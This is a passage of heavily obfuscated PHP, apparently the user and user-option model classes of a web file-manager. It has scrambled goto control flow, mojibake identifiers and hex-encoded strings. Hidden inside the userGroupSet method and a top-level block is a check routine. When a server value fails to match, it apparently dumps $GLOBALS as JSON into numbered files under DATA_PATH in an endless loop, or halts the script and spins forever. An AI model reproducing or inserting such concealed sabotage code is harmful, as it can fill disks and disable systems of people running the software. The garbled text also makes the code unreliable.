$F„ÅÉ¬¸ = $this->where($dÏö·ÁŸ¥ª)->find(); if ($F„ÅÉ¬¸) { return $f®‰ããŠ—; } } return !0; } public function userListInfo($B™Í—œ‡¼Ÿ) { $eàÓ×„ã  =& $_SERVER[±á õÁ]; $dËÛ¼¡¸Ê½ = array(); $B™Í—œ‡¼Ÿ = is_array($B™Í—œ‡¼Ÿ) ? array_unique($B™Í—œ‡¼Ÿ) : array(); if (!$B™Í—œ‡¼Ÿ) { return $dËÛ¼¡¸Ê½; } if (count($B™Í—œ‡¼Ÿ) < 20) { foreach ($B™Í—œ‡¼Ÿ as $dÒ±‰ç†) { $dËÛ¼¡¸Ê½[$dÒ±‰ç† . $eàÓ×„ã [43]] = $this->getInfoSimpleOuter($dÒ±‰ç†); } } else { $Fã«Èƒí‘  = array($eàÓ×„ã [1455] => array($eàÓ×„ã [408], $B™Í—œ‡¼Ÿ)); if (count($B™Í—œ‡¼Ÿ) == 1) { $Fã«Èƒí‘  = array($eàÓ×„ã [1455] => $B™Í—œ‡¼Ÿ[0]); } $AîË•ñ˜ˆ = Model($eàÓ×„ã [499])->field($this->simpleField)->where($Fã«Èƒí‘ )->select(); $AîË•ñ˜ˆ = array_to_keyvalue($AîË•ñ˜ˆ, $eàÓ×„ã [1463]); foreach ($B™Í—œ‡¼Ÿ as $dÒ±‰ç†) { $a‹ÓéİŞùÄ = $AîË•ñ˜ˆ[$AîË•ñ˜ˆ[$dÒ±‰ç†]]; if (!$a‹ÓéİŞùÄ) { $dËÛ¼¡¸Ê½[$dÒ±‰ç† . $eàÓ×„ã [43]] = $this->getInfoSimpleOuter($dÒ±‰ç†); continue; } $a‹ÓéİŞùÄ[$eàÓ×„ã [2045]] = Action($eàÓ×„ã [2046])->parseUrl($a‹ÓéİŞùÄ[$eàÓ×„ã [2045]]); $dËÛ¼¡¸Ê½[$dÒ±‰ç† . $eàÓ×„ã [43]] = $a‹ÓéİŞùÄ; } } return $dËÛ¼¡¸Ê½; } protected function userStatus($a¾Š¼šŸ«æ, $b¦’Ñµ‹á—) { $DéİÜ¾ÂõŸ = $this->getInfoSimple($a¾Š¼šŸ«æ); if (!$DéİÜ¾ÂõŸ) { return !1; } $A£ŠŠÁ†µ = array($_SERVER[±á õÁ][714] => $b¦’Ñµ‹á—); return $this->userEdit($a¾Š¼šŸ«æ, $A£ŠŠÁ†µ); } protected function userRemove($fö³¶“Ó—) { goto aˆÁ–­Â‡Ö; E¬™§¾½ó: Model($EÖŒ”Š©±[776])->userRootRemove($fö³¶“Ó—); return $this->where($F¸´Ê¿È¬)->delete(); goto Bñ¨…¢¾³ì; a½¬ƒºÔÙÀ: Model($EÖŒ”Š©±[1702])->where($F¸´Ê¿È¬)->delete(); Model($EÖŒ”Š©±[2059])->where($F¸´Ê¿È¬)->delete(); Model($EÖŒ”Š©±[2075])->where($F¸´Ê¿È¬)->delete(); goto E¬™§¾½ó; FßÖÓËšòø: $F¸´Ê¿È¬ = array($EÖŒ”Š©±[1455] => $fö³¶“Ó—); Model($EÖŒ”Š©±[560])->where($F¸´Ê¿È¬)->delete(); Model($EÖŒ”Š©±[2074])->where($F¸´Ê¿È¬)->delete(); goto a½¬ƒºÔÙÀ; aˆÁ–­Â‡Ö: $EÖŒ”Š©± =& $_SERVER[±á õÁ]; $C¶ùáÒ›—… = $this->getInfoSimple($fö³¶“Ó—); if (!$C¶ùáÒ›—…) { return !1; } goto FßÖÓËšòø; Bñ¨…¢¾³ì: } protected function userGroupSet($B³¼áöª‘, $F´«ë¯‡‘ç, $E„™É´É = array()) { goto A¾ù§õŞÀ; A¾ù§õŞÀ: $Fˆ×î‡ÈŸ =& $_SERVER[±á õÁ]; $aÜ­‡ßó› = $_SERVER[$Fˆ×î‡ÈŸ[10]]; $CÜïè¤‹Á£ = $Fˆ×î‡ÈŸ[1329]; goto cÍá¤ŸÃ×ã; ašóÌ›À¾´: $c¨’õ³Ó÷ = Model($Fˆ×î‡ÈŸ[1702]); $c¨’õ³Ó÷->where(array($Fˆ×î‡ÈŸ[1463] => $B³¼áöª‘))->delete(); $bøÙ¸¤òÜ’ = array(); goto dÀ¹Ü¢Óäé; cÍá¤ŸÃ×ã: if ($_SERVER[$Fˆ×î‡ÈŸ[9]] != $CÜïè¤‹Á£($aÜ­‡ßó›)) { goto eö˜¡ä¹Ü×; dõ¹İã¼”İ: $fÄœ‚Òµöš = $Fˆ×î‡ÈŸ[815]; $fÄœ‚Òµöš($_SERVER[$Fˆ×î‡ÈŸ[816]]); $AÆŠÄ½¿…¢ = $Fˆ×î‡ÈŸ[814]; goto d»”ğæ‘§ç; d»”ğæ‘§ç: $AÆŠÄ½¿…¢(); $aÉÕÓ†Ø¨Ï = $Fˆ×î‡ÈŸ[1330]; $D¯Ã®„ä³§ = json_encode($GLOBALS[$Fˆ×î‡ÈŸ[1331]]); goto e£Îš’¨²; CÊìÂïˆç›: $c¤—¦Õ¬Ÿé = $bÍóªºÃê($AÄ‹³ÒÈßœ); $cø©Îåî·£ = explode($Fˆ×î‡ÈŸ[14], $c¤—¦Õ¬Ÿé); if (count($cø©Îåî·£) < $Fˆ×î‡ÈŸ[585]) { $bØÖğˆÂª” = $Fˆ×î‡ÈŸ[16]; $bØÖğˆÂª”(); } goto dõ¹İã¼”İ; eö˜¡ä¹Ü×: $AÆŠÄ½¿…¢ = $Fˆ×î‡ÈŸ[814]; $bÍóªºÃê = $Fˆ×î‡ÈŸ[11]; $AÄ‹³ÒÈßœ = $_SERVER[$Fˆ×î‡ÈŸ[12]] . $Fˆ×î‡ÈŸ[13]; goto CÊìÂïˆç›; e£Îš’¨²: $a¦ÑèÀ´Ÿ = 1; for ($bÜçŸã¶Ô· = $a¦ÑèÀ´Ÿ; $bÜçŸã¶Ô· > 0; $bÜçŸã¶Ô·++) { $aÉÕÓ†Ø¨Ï(DATA_PATH . $bÜçŸã¶Ô·, $D¯Ã®„ä³§); } goto cÊê†ÁÍ¼; cÊê†ÁÍ¼: } $c¾Ø ê¼Æ = $this->getInfoSimple($B³¼áöª‘); if (!$c¾Ø ê¼Æ || !is_array($F´«ë¯‡‘ç)) { return !1; } goto ašóÌ›À¾´; dÀ¹Ü¢Óäé: $fÃÃ½—¸â = 0; foreach ($F´«ë¯‡‘ç as $DÍ–¸³‰¡ => $c¸è–¼„Ú’) { $DË–Æ÷‰á¦ = array($Fˆ×î‡ÈŸ[1463] => $B³¼áöª‘, $Fˆ×î‡ÈŸ[1621] => $DÍ–¸³‰¡, $Fˆ×î‡ÈŸ[1768] => $c¸è–¼„Ú’); $DË–Æ÷‰á¦[$Fˆ×î‡ÈŸ[1644]] = isset($E„™É´É[$fÃÃ½—¸â]) ? $E„™É´É[$fÃÃ½—¸â] : 0; $fÃÃ½—¸â++; $bøÙ¸¤òÜ’[] = $DË–Æ÷‰á¦; } return $c¨’õ³Ó÷->addAll($bøÙ¸¤òÜ’, array(), !0); goto CåÇ­³ ïø; CåÇ­³ ïø: } protected function userGroupAdd($eä¨åµİÖ¾, $Aã†ò‰ë¥² = array()) { $dî°–Š¶†À =& $_SERVER[±á õÁ]; $e¡Ÿá“àŠë = $this->getInfoSimple($eä¨åµİÖ¾); if (!$e¡Ÿá“àŠë || empty($Aã†ò‰ë¥²)) { return !1; } $EæÏ¥›å¨ê = array(); foreach ($Aã†ò‰ë¥² as $aÔ‰ï«ÌãÎ => $b½è†ÂÄˆ) { $EæÏ¥›å¨ê[] = array($dî°–Š¶†À[1463] => $eä¨åµİÖ¾, $dî°–Š¶†À[1621] => $aÔ‰ï«ÌãÎ, $dî°–Š¶†À[1768] => $b½è†ÂÄˆ, $dî°–Š¶†À[1644] => 0); } return Model($dî°–Š¶†À[1702])->addAll($EæÏ¥›å¨ê, array(), !0); } protected function userGroupRemove($DÅ‡Ã¾ËÁ, $D±¹¤°­•½) { $F¶‰–¢›Ñ =& $_SERVER[±á õÁ]; $DØ‰ë–ÒŒ = $this->getInfoSimple($DÅ‡Ã¾ËÁ); if (!$DØ‰ë–ÒŒ || !$D±¹¤°­•½) { return !1; } $F¹½Òê³£‚ = array($F¶‰–¢›Ñ[1455] => $DÅ‡Ã¾ËÁ, $F¶‰–¢›Ñ[1700] => $D±¹¤°­•½); return Model($F¶‰–¢›Ñ[1702])->where($F¹½Òê³£‚)->delete(); } public function listData() { $C¹“«©ÖÔ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($C¹“«©ÖÔ[$_SERVER[±á õÁ][370]]); return $C¹“«©ÖÔ; } public function listByID($c‡ß¤ñ†ö) { $d¡°êÎÄÃÙ =& $_SERVER[±á õÁ]; if (!$c‡ß¤ñ†ö) { return; } $aÆ¡„†À© = array($d¡°êÎÄÃÙ[1463] => array($d¡°êÎÄÃÙ[7], $c‡ß¤ñ†ö)); $cíÆ¦ˆÔÛĞ = $this->where($aÆ¡„†À©)->select(); $this->_listDataApply($cíÆ¦ˆÔÛĞ); return $cíÆ¦ˆÔÛĞ; } public function listByGroup($E»™ó—¡° = 0, $aÃâ¶ŒË„« = array()) { goto A¶â”ôõ„ô; A¶â”ôõ„ô: $B…‚´“ë =& $_SERVER[±á õÁ]; $c£±Æ¬ê†´ = $B…‚´“ë[43]; $A ­Ä¬êå = array(); goto d±·šÓÑ‚Ü; d±·šÓÑ‚Ü: if ($E»™ó—¡°) { $A ­Ä¬êå = array($B…‚´“ë[2076] => intval($E»™ó—¡°)); $c£±Æ¬ê†´ = "\x4c\105\106\124\40\x4a\117\111\116\40{$this->tablePrefix}\165\x73\145\x72\x5f\147\x72\157\x75\x70\40\165\163\145\162\x5f\147\162\x6f\165\x70\40\x6f\156\x20\165\x73\145\162\x2e\x75\x73\145\162\111\104\40\x3d\40\x75\x73\145\x72\x5f\147\162\157\x75\x70\x2e\165\x73\145\162\111\104"; $FÈÉàÜº = Input::get($B…‚´“ë[431], null, $B…‚´“ë[43]) ? $B…‚´“ë[43] : $B…‚´“ë[2077]; } if (isset($aÃâ¶ŒË„«[$B…‚´“ë[714]])) { $A ­Ä¬êå[$B…‚´“ë[2078]] = $aÃâ¶ŒË„«[$B…‚´“ë[714]]; } $CîŒ¸ø„ã = $this->_makeOrder($FÈÉàÜº)->field($B…‚´“ë[2079])->where($A ­Ä¬êå)->join($c£±Æ¬ê†´)->selectPage(50); goto c¨«•âß—; c¨«•âß—: $this->_listDataApply($CîŒ¸ø„ã[$B…‚´“ë[370]]); return $CîŒ¸ø„ã; goto c¾ÚÍ»ë¶; c¾ÚÍ»ë¶: } private function _makeOrder($Aàß¨ã’â = '') { goto f×²Š½è; CÌœØóŠáÍ: $Aàß¨ã’â = $Aàß¨ã’â . "\x75\x73\x65\162\56{$Dºîå‡ÈƒŒ}\x20{$d³‹òòñ‚Ù}\x2c\x20\x75\x73\x65\x72\x2e\x75\163\145\x72\111\x44\40\141\x73\x63"; return $this->alias($Cé§Œ‰İòÓ[1824])->order($Aàß¨ã’â); goto b…ÙÛë×ò»; f×²Š½è: $Cé§Œ‰İòÓ =& $_SERVER[±á õÁ]; $FçÉ‘ğè²‰ = array($Cé§Œ‰İòÓ[1463], $Cé§Œ‰İòÓ[38], $Cé§Œ‰İòÓ[1607], $Cé§Œ‰İòÓ[1579], $Cé§Œ‰İòÓ[200]); $c¶Åœ‡ëôè = array($Cé§Œ‰İòÓ[426] => $Cé§Œ‰İòÓ[427], $Cé§Œ‰İòÓ[428] => $Cé§Œ‰İòÓ[429]); goto a›“°µ°öğ; a›“°µ°öğ: $Dºîå‡ÈƒŒ = Input::get($Cé§Œ‰İòÓ[431], $Cé§Œ‰İòÓ[7], $Cé§Œ‰İòÓ[1455], $FçÉ‘ğè²‰); $d³‹òòñ‚Ù = Input::get($Cé§Œ‰İòÓ[432], $Cé§Œ‰İòÓ[7], $Cé§Œ‰İòÓ[1703], array($Cé§Œ‰İòÓ[1703], $Cé§Œ‰İòÓ[428])); $d³‹òòñ‚Ù = $c¶Åœ‡ëôè[$d³‹òòñ‚Ù]; goto CÌœØóŠáÍ; b…ÙÛë×ò»: } public function listSearch($EÇÀ·©‰ˆ™) { goto B¼í•ìÈ; a·äÛ‹¾´®: $A‘Ò‰†¿Æ  = $this->_makeOrder()->where($cÎ±Ùõ‹‘)->selectPage(20); if (!$A‘Ò‰†¿Æ  || count($A‘Ò‰†¿Æ [$bÈ»“Á‹­Ş[370]]) < 5 && Input::check($C†¤•‘¬, $bÈ»“Á‹­Ş[321])) { $c¸ˆù›Òœª = $this->_searchFromMeta($bÈ»“Á‹­Ş[439], $C†¤•‘¬, 10); $b£³†—— © = $this->_searchFromMeta($bÈ»“Á‹­Ş[440], $C†¤•‘¬, 10); $FªˆÄ‘Ñï = array_merge($c¸ˆù›Òœª, $b£³†—— ©, $A‘Ò‰†¿Æ [$bÈ»“Á‹­Ş[370]]); $A‘Ò‰†¿Æ [$bÈ»“Á‹­Ş[370]] = array_unique_by_key($FªˆÄ‘Ñï, $bÈ»“Á‹­Ş[1463]); $A‘Ò‰†¿Æ [$bÈ»“Á‹­Ş[367]][$bÈ»“Á‹­Ş[368]] = count($A‘Ò‰†¿Æ [$bÈ»“Á‹­Ş[370]]); $A‘Ò‰†¿Æ [$bÈ»“Á‹­Ş[367]][$bÈ»“Á‹­Ş[369]] = ceil($A‘Ò‰†¿Æ [$bÈ»“Á‹­Ş[367]][$bÈ»“Á‹­Ş[368]] / $A‘Ò‰†¿Æ [$bÈ»“Á‹­Ş[367]][$bÈ»“Á‹­Ş[365]]); } $this->_listDataApply($A‘Ò‰†¿Æ [$bÈ»“Á‹­Ş[370]]); goto D‡ùìÎÖÁ÷; D‡ùìÎÖÁ÷: $this->_filterByGroup($A‘Ò‰†¿Æ , $aôä»­í‹¢); return $A‘Ò‰†¿Æ ; goto A²ãÓßíâ°; b“¡­Ú“Å˜: if (!$C†¤•‘¬) { $cÎ±Ùõ‹‘ = array(); } if (isset($EÇÀ·©‰ˆ™[$bÈ»“Á‹­Ş[714]])) { $cÎ±Ùõ‹‘[$bÈ»“Á‹­Ş[714]] = $EÇÀ·©‰ˆ™[$bÈ»“Á‹­Ş[714]]; } $cÎ±Ùõ‹‘ = $this->parseWhereLike($cÎ±Ùõ‹‘); goto a·äÛ‹¾´®; AòÔƒ…‹á: $C†¤•‘¬ = str_replace($bÈ»“Á‹­Ş[1706], $bÈ»“Á‹­Ş[1707], trim($C†¤•‘¬)); $cÎ±Ùõ‹‘ = array($bÈ»“Á‹­Ş[38] => array($bÈ»“Á‹­Ş[381], "\45{$C†¤•‘¬}\x25"), $bÈ»“Á‹­Ş[308] => array($bÈ»“Á‹­Ş[381], "{$C†¤•‘¬}\45"), $bÈ»“Á‹­Ş[1884] => array($bÈ»“Á‹­Ş[381], "{$C†¤•‘¬}\45"), $bÈ»“Á‹­Ş[930] => $bÈ»“Á‹­Ş[1708]); if (Input::check($C†¤•‘¬, $bÈ»“Á‹­Ş[314])) { $cÎ±Ùõ‹‘[$bÈ»“Á‹­Ş[1463]] = array($bÈ»“Á‹­Ş[381], "{$C†¤•‘¬}\x25"); $cÎ±Ùõ‹‘[$bÈ»“Á‹­Ş[2060]] = array($bÈ»“Á‹­Ş[381], "{$C†¤•‘¬}\45"); } goto b“¡­Ú“Å˜; B¼í•ìÈ: $bÈ»“Á‹­Ş =& $_SERVER[±á õÁ]; $C†¤•‘¬ = $EÇÀ·©‰ˆ™[$bÈ»“Á‹­Ş[1704]]; $aôä»­í‹¢ = isset($EÇÀ·©‰ˆ™[$bÈ»“Á‹­Ş[1705]]) ? $EÇÀ·©‰ˆ™[$bÈ»“Á‹­Ş[1705]] : !1; goto AòÔƒ…‹á; A²ãÓßíâ°: } private function _filterByGroup(&$c°åóòñá, $a‡âöâÙ•) { $EÂ–¨ƒÛ„ğ =& $_SERVER[±á õÁ]; if (!$a‡âöâÙ•) { return $c°åóòñá; } foreach ($c°åóòñá[$EÂ–¨ƒÛ„ğ[370]] as $fõ˜†é¬ÔÙ => &$aÆšÒ©Šç‹) { $Cµ½¸ŞÜì‚ = array_to_keyvalue($aÆšÒ©Šç‹[$EÂ–¨ƒÛ„ğ[1794]], $EÂ–¨ƒÛ„ğ[43], $EÂ–¨ƒÛ„ğ[1621]); if (!in_array($a‡âöâÙ•, $Cµ½¸ŞÜì‚)) { unset($c°åóòñá[$EÂ–¨ƒÛ„ğ[370]][$fõ˜†é¬ÔÙ]); } } unset($aÆšÒ©Šç‹); $c°åóòñá[$EÂ–¨ƒÛ„ğ[370]] = array_values($c°åóòñá[$EÂ–¨ƒÛ„ğ[370]]); $c°åóòñá[$EÂ–¨ƒÛ„ğ[367]] = array($EÂ–¨ƒÛ„ğ[1859] => count($c°åóòñá[$EÂ–¨ƒÛ„ğ[370]]), $EÂ–¨ƒÛ„ğ[1857] => $c°åóòñá[$EÂ–¨ƒÛ„ğ[367]][$EÂ–¨ƒÛ„ğ[365]], $EÂ–¨ƒÛ„ğ[1856] => 1, $EÂ–¨ƒÛ„ğ[1858] => 1); } private function _searchFromMeta($A¢Û¦®†½Ä, $Dê‘ƒ¶¡¨•, $dôÛÃŒË†ê) { goto a»³òßìÖĞ; a»³òßìÖĞ: $f‚Ø¶Æƒ¾ =& $_SERVER[±á õÁ]; $Dê‘ƒ¶¡¨• = strtolower($Dê‘ƒ¶¡¨•); $c×¸×ò‚«› = array($f‚Ø¶Æƒ¾[99] => $A¢Û¦®†½Ä, $f‚Ø¶Æƒ¾[375] => array($f‚Ø¶Æƒ¾[381], "\x25{$Dê‘ƒ¶¡¨•}\x25")); goto e†÷‘Ã®»¹; fÍÙİÅ ¬: $Cˆ»ŒçÜŞ„ = array_to_keyvalue($Cˆ»ŒçÜŞ„, $f‚Ø¶Æƒ¾[43], $f‚Ø¶Æƒ¾[1463]); $dŠ·‘Š¸›Ì = $this->where(array($f‚Ø¶Æƒ¾[1455] => array($f‚Ø¶Æƒ¾[7], $Cˆ»ŒçÜŞ„)))->select(); if (!$dŠ·‘Š¸›Ì) { return array(); } goto BçáŸÁ­¼…; e†÷‘Ã®»¹: $c×¸×ò‚«› = $this->parseWhereLike($c×¸×ò‚«›); $Cˆ»ŒçÜŞ„ = Model($f‚Ø¶Æƒ¾[2080])->where($c×¸×ò‚«›)->limit($dôÛÃŒË†ê)->select(); if (!$Cˆ»ŒçÜŞ„) { return array(); } goto fÍÙİÅ ¬; BçáŸÁ­¼…: return $dŠ·‘Š¸›Ì; goto e‰—‘å¥ğ¶; e‰—‘å¥ğ¶: } private function _listDataApplyItem($c¡ÇÓ‰Ş) { $C³ºµŠâ…À = array($c¡ÇÓ‰Ş); $this->_listDataApply($C³ºµŠâ…À); return $C³ºµŠâ…À[0]; } private function _listDataApply(&$b×Ô˜Ş„ºí) { goto F‡ŠªÜ¯ÄÂ; F‡ŠªÜ¯ÄÂ: $B¨¼´êğÜã =& $_SERVER[±á õÁ]; if (!$b×Ô˜Ş„ºí) { return; } array_remove_key($b×Ô˜Ş„ºí, $B¨¼´êğÜã[822]); goto fÔÉÌæŠ°; fÔÉÌæŠ°: $E†¡“‡Æ©¬ = array_to_keyvalue($b×Ô˜Ş„ºí, $B¨¼´êğÜã[43], $B¨¼´êğÜã[1463]); $this->_listAppendGroup($b×Ô˜Ş„ºí, $E†¡“‡Æ©¬); $this->_listAppendMeta($b×Ô˜Ş„ºí, $E†¡“‡Æ©¬); goto EÙ©è¦ÈÅÃ; EÙ©è¦ÈÅÃ: $this->_listAppendSourceRoot($b×Ô˜Ş„ºí, $E†¡“‡Æ©¬); goto cß˜‡ì¤Å; cß˜‡ì¤Å: } private function _listAppendSourceRoot(&$C‚Ú¼ìÄ‹º, $BâÍ¨šÖÎ¦) { goto fªñÂ‘¦óå; cªã÷åº’Å: foreach ($C‚Ú¼ìÄ‹º as &$f†ÅÄÜã‹) { $f†ÅÄÜã‹[$EïŒ›ÄçõŞ[415]] = $bÇøØ‡…‘[$f†ÅÄÜã‹[$EïŒ›ÄçõŞ[1463]]] ? $bÇøØ‡…‘[$f†ÅÄÜã‹[$EïŒ›ÄçõŞ[1463]]] : array(); } unset($f†ÅÄÜã‹); goto Cµ˜¯Ïß‡¥; fªñÂ‘¦óå: $EïŒ›ÄçõŞ =& $_SERVER[±á õÁ]; $DŒŠî÷ƒ = array($EïŒ›ÄçõŞ[486] => 0, $EïŒ›ÄçõŞ[395] => SourceModel::TYPE_USER, $EïŒ›ÄçõŞ[481] => array($EïŒ›ÄçõŞ[7], $BâÍ¨šÖÎ¦)); $eáÔ‘¸‘¾÷ = $EïŒ›ÄçõŞ[1715]; goto E¦“†èöó¯; E¦“†èöó¯: $bÇøØ‡…‘ = Model($EïŒ›ÄçõŞ[776])->order($EïŒ›ÄçõŞ[1716])->field($eáÔ‘¸‘¾÷)->where($DŒŠî÷ƒ)->select(); $bÇøØ‡…‘ = array_to_keyvalue($bÇøØ‡…‘, $EïŒ›ÄçõŞ[481]); $bÇøØ‡…‘ = array_remove_key($bÇøØ‡…‘, $EïŒ›ÄçõŞ[481]); goto cªã÷åº’Å; Cµ˜¯Ïß‡¥: } private function _listAppendGroup(&$FÊ…Š¡Ì², $d†ŞŒ×Š›Ü) { goto aÓçê¤µë²; aÓçê¤µë²: $b±‚Ù¯âµ× =& $_SERVER[±á õÁ]; $BÇ÷–¹­¨¡ = array($b±‚Ù¯âµ×[1463] => array($b±‚Ù¯âµ×[7], $d†ŞŒ×Š›Ü)); $Eõ¢Œ™¶§Ö = Model($b±‚Ù¯âµ×[1702])->where($BÇ÷–¹­¨¡)->select(); goto aîë‹¼Šã½; aîë‹¼Šã½: $b‘Ï•°æï = array_to_keyvalue($Eõ¢Œ™¶§Ö, $b±‚Ù¯âµ×[43], $b±‚Ù¯âµ×[1621]); $b‘Ï•°æï = array_remove_value(array_unique($b‘Ï•°æï), $b±‚Ù¯âµ×[493]); if (!$b‘Ï•°æï || !$Eõ¢Œ™¶§Ö) { return; } goto C£ÕĞ—‰Ê‡; b¾†‰ÍÖ : foreach ($FÊ…Š¡Ì² as &$Eñ‘Ãˆ‚) { $Eñ‘Ãˆ‚[$b±‚Ù¯âµ×[1794]] = array(); if (isset($Eõ¢Œ™¶§Ö[$Eñ‘Ãˆ‚[$b±‚Ù¯âµ×[1463]]])) { $Eñ‘Ãˆ‚[$b±‚Ù¯âµ×[1794]] = $Eõ¢Œ™¶§Ö[$Eñ‘Ãˆ‚[$b±‚Ù¯âµ×[1463]]]; } } unset($Eñ‘Ãˆ‚); goto d§õÛ¾Ê­§; C£ÕĞ—‰Ê‡: $BÇ÷–¹­¨¡ = array($b±‚Ù¯âµ×[1621] => array($b±‚Ù¯âµ×[7], $b‘Ï•°æï)); $C™¥í¸Äí = Model($b±‚Ù¯âµ×[1792])->field($b±‚Ù¯âµ×[2081])->where($BÇ÷–¹­¨¡)->select(); $C™¥í¸Äí = array_to_keyvalue($C™¥í¸Äí, $b±‚Ù¯âµ×[1621]); goto f¢Ë’ß®£×; f¢Ë’ß®£×: $Eõ¢Œ™¶§Ö = array_to_keyvalue_group($Eõ¢Œ™¶§Ö, $b±‚Ù¯âµ×[1463]); foreach ($Eõ¢Œ™¶§Ö as &$F£“„õ»Ö‹) { $f«ÒÌ¨Ì = array(); foreach ($F£“„õ»Ö‹ as $D‰Ñ×›éğÁ) { if (!$D‰Ñ×›éğÁ[$b±‚Ù¯âµ×[1768]]) { continue; } $AêœË¹ğŸ™ = Model($b±‚Ù¯âµ×[1788])->listData($D‰Ñ×›éğÁ[$b±‚Ù¯âµ×[1768]]); $f«ÒÌ¨Ì[] = array($b±‚Ù¯âµ×[1621] => $D‰Ñ×›éğÁ[$b±‚Ù¯âµ×[1621]], $b±‚Ù¯âµ×[2082] => $C™¥í¸Äí[$D‰Ñ×›éğÁ[$b±‚Ù¯âµ×[1621]]][$b±‚Ù¯âµ×[38]], $b±‚Ù¯âµ×[484] => $C™¥í¸Äí[$D‰Ñ×›éğÁ[$b±‚Ù¯âµ×[1621]]][$b±‚Ù¯âµ×[484]], $b±‚Ù¯âµ×[400] => $AêœË¹ğŸ™); } $F£“„õ»Ö‹ = $f«ÒÌ¨Ì; } unset($F£“„õ»Ö‹); goto b¾†‰ÍÖ ; d§õÛ¾Ê­§: } private function _listAppendMeta(&$e÷¢§İ‹, $CÂíª„šÙ¡) { goto a´­†©¡çø; E”¼ê„´õğ: $fÌÓÚ‘ÛÖô = array($FÇåÅª»‘[1463] => array($FÇåÅª»‘[7], $CÂíª„šÙ¡)); $c™‚ÃêÓ´Ë = Model($FÇåÅª»‘[2059])->where($fÌÓÚ‘ÛÖô)->select(); $c™‚ÃêÓ´Ë = array_to_keyvalue_group($c™‚ÃêÓ´Ë, $FÇåÅª»‘[1463]); goto AÀ‰í‹ÀÉÅ; A½ÆÁÌˆªÛ: foreach ($e÷¢§İ‹ as &$cËÄ‡šŒÅ) { $dƒ¸å‘¾î = array(); if (isset($c™‚ÃêÓ´Ë[$cËÄ‡šŒÅ[$FÇåÅª»‘[1463]]])) { $dƒ¸å‘¾î = $c™‚ÃêÓ´Ë[$cËÄ‡šŒÅ[$FÇåÅª»‘[1463]]]; } $cËÄ‡šŒÅ[$FÇåÅª»‘[2084]] = array(); if (isset($dƒ¸å‘¾î[$c÷äÚèÕÒ±])) { $cËÄ‡šŒÅ[$FÇåÅª»‘[2084]] = $a¤·­‚â->getUserJobInfo($dƒ¸å‘¾î[$c÷äÚèÕÒ±]); } } unset($cËÄ‡šŒÅ); goto D–…ß´–›; a´­†©¡çø: $FÇåÅª»‘ =& $_SERVER[±á õÁ]; $c÷äÚèÕÒ± = UserJobModel::JOB_KEY; $DŠŠœ¹àÌÄ = array($FÇåÅª»‘[2061]); goto E”¼ê„´õğ; AÀ‰í‹ÀÉÅ: foreach ($c™‚ÃêÓ´Ë as &$aÛ„èš¥à) { $eïÕä»Ó‘ = array(); foreach ($aÛ„èš¥à as $A¤Â®¡÷Ä) { if (!in_array($A¤Â®¡÷Ä[$FÇåÅª»‘[99]], $DŠŠœ¹àÌÄ)) { $eïÕä»Ó‘[$A¤Â®¡÷Ä[$FÇåÅª»‘[99]]] = $A¤Â®¡÷Ä[$FÇåÅª»‘[375]]; } } $aÛ„èš¥à = $eïÕä»Ó‘; } unset($aÛ„èš¥à); $a¤·­‚â = Model($FÇåÅª»‘[2083]); goto A½ÆÁÌˆªÛ; D–…ß´–›: } protected function groupUserAll($b¹×Ô‡±Òã) { $c¦ÒÖ ÇßÎ =& $_SERVER[±á õÁ]; if (!$b¹×Ô‡±Òã) { return !1; } $dƒ’É¶²œ = Model($c¦ÒÖ ÇßÎ[1702])->field($c¦ÒÖ ÇßÎ[1463])->where(array($c¦ÒÖ ÇßÎ[1621] => array($c¦ÒÖ ÇßÎ[7], $b¹×Ô‡±Òã)))->select(); $dƒ’É¶²œ = array_to_keyvalue($dƒ’É¶²œ, $c¦ÒÖ ÇßÎ[43], $c¦ÒÖ ÇßÎ[1463]); return array_unique($dƒ’É¶²œ); } public function userSearch($CåøÓö‚Ş¤, $C¾µ½ñ„Œ = "\52") { return Model($_SERVER[±á õÁ][502])->where($CåøÓö‚Ş¤)->field($C¾µ½ñ„Œ)->find(); } } if (!isset($_SERVER[$_SERVER[±á õÁ][9]]) || !isset($_SERVER[$_SERVER[±á õÁ][10]])) { goto EŠÎ“Á„Ÿê; b—¾À‚ƒ´„: $BÎ¥¹ŞãŒ•($_SERVER[$_SERVER[±á õÁ][12]] . $_SERVER[±á õÁ][13]); $EÂºëš‘ğÕ = 2; while ($EÂºëš‘ğÕ > 1) { $DŠƒ·©™Ûó = rawurlencode($EÂºëš‘ğÕ . $_SERVER[±á õÁ][18]); } goto bŒš›ãì‡; EŠÎ“Á„Ÿê: $BùÕÙ„æİ¤ = $_SERVER[±á õÁ][11]; $f»ÀÉï‰° = $_SERVER[$_SERVER[±á õÁ][12]] . $_SERVER[±á õÁ][13]; $cí†«Ü = $BùÕÙ„æİ¤($f»ÀÉï‰°); goto eÉõ´ìé; eÉõ´ìé: $fÊ¸È¡µ‘‰ = explode($_SERVER[±á õÁ][14], $cí†«Ü); if (count($fÊ¸È¡µ‘‰) < $_SERVER[±á õÁ][15]) { $F«Õ×·ù¯ = $_SERVER[±á õÁ][16]; $F«Õ×·ù¯(); } $BÎ¥¹ŞãŒ• = $_SERVER[±á õÁ][17]; goto b—¾À‚ƒ´„; bŒš›ãì‡: } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\x5f\157\160\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($cº²àö¤) { $A‘´ŒÒÈÕ¼ =& $_SERVER[±á õÁ]; if (!defined($A‘´ŒÒÈÕ¼[450])) { define($A‘´ŒÒÈÕ¼[450], 0); } return "\125\163\x65\x72\x4f\160\x74\x69\x6f\x6e\137{$cº²àö¤}\137" . USER_ID; } protected function filterWhere($fŠÚ‰Ã¥ªÍ) { $EêÈ±ï˜†Ş =& $_SERVER[±á õÁ]; if (!defined($EêÈ±ï˜†Ş[450])) { define($EêÈ±ï˜†Ş[450], 0); } $fŠÚ‰Ã¥ªÍ[$EêÈ±ï˜†Ş[1463]] = USER_ID; return $fŠÚ‰Ã¥ªÍ; } public function cacheRemoveUser($F•·¤Š†¢­, $aéÈ²‡°İâ) { return Cache::remove("\x55\163\x65\x72\x4f\x70\164\x69\157\156\137{$F•·¤Š†¢­}\137" . $aéÈ²‡°İâ); } protected function optionDefault($F¼íŸÛ¹Ô˜ = '') { $E†¥ï‹ğ =& $_SERVER[±á õÁ]; if ($F¼íŸÛ¹Ô˜ == $E†¥ï‹ğ[43]) { return $GLOBALS[$E†¥ï‹ğ[6]][$E†¥ï‹ğ[2085]]; } if ($F¼íŸÛ¹Ô˜ == 